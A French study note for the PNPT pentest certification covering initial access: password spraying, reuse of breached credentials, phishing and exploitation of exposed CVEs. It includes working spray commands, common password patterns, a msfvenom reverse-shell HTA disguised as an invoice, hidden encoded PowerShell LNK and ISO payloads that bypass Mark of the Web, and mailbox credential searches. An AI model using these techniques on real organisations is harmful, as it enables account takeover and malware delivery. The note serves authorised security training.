---
title: "Initial Access (PNPT)"
domain: "Applied Sciences"
subdomain: "Computer Science > Security > PNPT"
tags: [sciences-appliquées, informatique, sécurité, initial-access, password-spray, phishing, pnpt]
date: "2026-05-18"
---

# Initial Access (Pentest externe)

L'accès initial, c'est le moment-charnière d'un pentest externe : on passe de "spectateur depuis Internet" à "pied dans la porte". Tout l'effort qui suit (énumération AD, privesc, DA) dépend de cette première brèche. Cette note couvre les 5 grandes voies d'entrée et la méthodologie pour les exploiter.

## Les cinq voies d'accès

```
                  Pentest externe
                          │
        ┌─────────────────┼─────────────────┐
        │                 │                 │
        ▼                 ▼                 ▼
   Password         Credentials      Application web
   spraying         de breach        vulnérable
   (OWA, O365,      (DeHashed,       (CVE, SQLi,
   VPN, RDP)        HIBP)             RCE, XXE...)
        │                 │                 │
        └─────────────────┼─────────────────┘
                          │
                          ▼
                  Premier accès
                          │
        ┌─────────────────┼─────────────────┐
        │                                   │
        ▼                                   ▼
   Phishing                          CVE pre-auth
   (si dans le                       (Exchange, Citrix,
   scope — souvent                   Fortinet, Log4j)
   pas en PNPT)
```

**À retenir** : sur un pentest externe d'entreprise typique, le password spraying et le breach reuse représentent **80% des accès initiaux réels**. Les CVE pre-auth glamour sont plus rares — la plupart des Exchange/Citrix exposés sont patchés.

## Password Spraying

### Construction de la wordlist d'utilisateurs

L'OSINT donne les noms d'employés. Reste à deviner le format d'email/username.

```bash
# Depuis LinkedIn
linkedin2username -c "Company" -d domaine.com

# Formats classiques à générer
john.smith
j.smith
jsmith
smith.j
smith
```

Une wordlist de 200 employés × 4 formats = 800 candidats à valider. `o365spray --enum` filtre ceux qui existent vraiment.

### Patterns de mots de passe courants

Le facteur humain est statistique. Ces patterns marchent souvent :

```
   Saison + Année (+ !)        : Spring2026, Summer2025!, Hiver2026
   Mois + Année + !            : January2026!
   NomEntreprise + 123 / !     : Cible123, CIBLE!, Cible2026
   Mots usuels                 : Welcome1, Password123, Changeme1!
   Issus de breaches du domaine: spécifiques, souvent jackpot
```

### Outils par service

#### O365 / OWA / Azure AD

```bash
# o365spray — le standard
o365spray --validate --domain cible.com               # vérifier que c'est bien O365
o365spray --enum -U users.txt --domain cible.com      # quels users existent ?
o365spray --spray -U valid_users.txt -p 'Spring2026!' --domain cible.com \
          --count 1 --lockout 30                       # spray respectueux du lockout

# MSOLSpray (PowerShell)
Invoke-MSOLSpray -UserList users.txt -Password 'Spring2026!'

# MailSniper (OWA on-prem, Exchange)
Invoke-PasswordSprayOWA -ExchHostname mail.cible.com -UserList users.txt -Password 'Spring2026!'
```

#### Active Directory (Kerberos pre-auth — silencieux)

```bash
kerbrute passwordspray -d cible.com --dc DC_IP users.txt 'Spring2026!'
```

#### SMB / WinRM (interne ou exposé)

```bash
crackmapexec smb IP -u users.txt -p 'Spring2026!' --continue-on-success
crackmapexec winrm IP -u users.txt -p 'Spring2026!' --continue-on-success
```

#### VPN (SSL / IPsec)

Fortinet, Pulse, Citrix — souvent via Burp Intruder ou modules dédiés. Lockout policy à vérifier d'abord.

### Règles d'or du spraying

```
   1 mot de passe à la fois → sur TOUS les users (jamais l'inverse)

   Espacer dans le temps    → 1 essai par compte / 30 min minimum
                              (Azure AD Smart Lockout est strict)

   Vérifier la lockout      → net accounts /domain pour AD
                              o365 = Smart Lockout dynamique

   Documenter chaque essai  → timestamp + user + password + résultat
                              utile pour le rapport et pour ne pas re-spray
```

## Credentials issus de breaches

```bash
# DeHashed (API ou web)
# Chercher : @cible.com → emails + mots de passe leak
# Tester ces couples sur les services exposés de la cible

# HaveIBeenPwned — confirmation qu'il y a eu un breach (pas le mot de passe)
# Utile pour cibler les employés dont les credentials ont fuité ailleurs
```

**La réutilisation est la règle** : un employé qui s'est inscrit avec son email pro sur un site oublié 5 ans en arrière, dont la base a fuité, utilise souvent encore le même mot de passe (variante mineure incluse).

## Phishing (si scope autorisé)

À la PNPT, **pas dans le scope** la plupart du temps. En pentest réel, c'est devenu le vecteur #1.

### Vecteurs courants

- **Fake login page** : Evilginx2 (capture cookies de session → bypass MFA), Modlishka, GoPhish
- **Pièces jointes** : HTA, ISO, LNK, OneNote (.one), macro Office, PDF avec lien malicieux
- **Browser-in-the-Browser (BITB)** : popup réaliste de login O365

### Frameworks

- **GoPhish** : campagne phishing classique (templates, tracking)
- **Evilginx2** : reverse proxy, capture les session cookies — contourne MFA
- **King Phisher** : alternative open-source

### Payloads de delivery

```bash
# HTA
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f hta-psh -o invoice.hta

# Macro Office (VBA) — EvilClippy, macro_pack
macro_pack.exe -t WINDOWS-RUN -o -G payload.docm

# LNK avec PowerShell encodé en base64
# Cible : powershell -nop -w hidden -enc <BASE64>

# OneNote (.one) — pièces jointes embarquées, très efficace en 2024-2026

# ISO/IMG — contourne Mark of the Web (MoTW)
genisoimage -o payload.iso -V "Documents" payload_dir/
```

**Pourquoi ISO contourne MoTW** : Windows applique Mark of the Web sur les fichiers téléchargés (rendus moins exécutables). ISO étant un format "monté", les fichiers à l'intérieur héritent rarement de MoTW.

## Exploitation d'applications exposées

### Recon avant exploit

```bash
# Détection de tech
whatweb http://cible.com
nuclei -t http/technologies/ -u http://cible.com

# Scan automatisé de vulns
nuclei -severity critical,high -u http://cible.com
```

### CVE classiques sur services exposés

| Service     | CVE                         | Description                  |
|-------------|-----------------------------|------------------------------|
| Exchange    | ProxyShell (CVE-2021-34473) | RCE pre-auth                 |
| Exchange    | ProxyLogon (CVE-2021-26855) | SSRF + RCE                   |
| Citrix ADC  | CVE-2023-3519               | RCE pre-auth                 |
| Fortinet    | CVE-2022-40684              | Auth bypass                  |
| GitLab      | CVE-2021-22205              | RCE non-auth                 |
| Confluence  | CVE-2022-26134              | OGNL injection               |
| Log4j       | CVE-2021-44228              | Log4Shell                    |
| MOVEit      | CVE-2023-34362              | SQLi → RCE                   |
| Ivanti VPN  | CVE-2023-46805 + CVE-2024-21887 | Auth bypass + RCE        |

```bash
# Recherche locale d'exploits
searchsploit "Apache 2.4.49"

# Scanner CVE avec Nuclei
nuclei -t cves/ -u http://cible.com
```

**Toujours vérifier la version exacte** avant de lancer un PoC. Beaucoup de PoC publics sont version-spécifiques.

## Cas particulier — accès à une boîte mail

Une fois OWA/O365 accessible, **ne pas s'arrêter là**. Les mailboxes sont des mines de credentials internes.

```bash
# MailSniper — chercher des credentials dans les mails
Invoke-SelfSearch -Mailbox user@cible.com -Terms 'password','vpn','wifi','admin'
Invoke-GlobalMailSearch -ImpersonationAccount user -ExchHostname mail.cible.com
```

Aussi à explorer :
- **OneDrive / SharePoint** (si O365) — souvent fichiers de credentials, configs VPN
- **Contacts internes** — adresses IP, DNS internes mentionnés
- **Onboarding emails** — souvent contiennent des creds par défaut

## Méthodologie complète (PNPT externe)

```
   Jour 1 — OSINT
     │
     ├─ Identifier employés → wordlist users
     ├─ Identifier services exposés (Shodan, Censys, scan léger)
     └─ Chercher breaches (DeHashed, HIBP)
                                │
                                ▼
   Jour 1-2 — Recon active légère
     │
     ├─ nmap -Pn -sS -p- sur les IPs in-scope
     ├─ Détection tech sur les sites
     └─ Énumération de users (kerbrute, o365spray --enum)
                                │
                                ▼
   Jour 2 — Tentatives d'accès en parallèle
     │
     ├─ Password spray O365/OWA avec saison/année
     ├─ Test des credentials de breach
     ├─ Test des CVE sur services exposés
     └─ Test des credentials par défaut sur dashboards exposés
                                │
                                ▼
   Premier accès
     │
     ├─ VPN/RDP    → énumération interne classique
     ├─ Webshell   → reverse shell + pivot
     └─ Mail accès → recherche credentials, OneDrive, SharePoint
```

## Pièges courants

- **Sprayer sans valider les users d'abord** : on déclenche des lockouts sur des comptes inexistants/désactivés, on grille le test. Toujours `--enum` avant `--spray`.
- **Azure AD Smart Lockout** : un essai par compte toutes les 10 minutes peut suffire à bloquer. Espacer plus largement (1h+) sur Azure.
- **Reuse de creds non testés sur tous les services** : un mot de passe O365 valide peut donner accès au VPN, au RDP, au GitLab interne. Tester systématiquement chaque foothold valide partout.
- **Phishing hors scope** : si l'engagement ne couvre pas le phishing, ne pas en faire — c'est une violation du contrat.
- **CVE non vérifiée en version** : exploiter une CVE qui n'affecte pas la version cible = du temps perdu et du bruit pour rien.
- **Mailbox accès = pas la fin** : trouver des credentials dans les mails est souvent l'étape qui mène au foothold interne réel. Toujours fouiller.
- **OAuth abuse** : sur O365, l'auth illicite (illicit consent grant) peut permettre l'accès sans même connaître le mot de passe. Voir Office 365 Attack Toolkit.
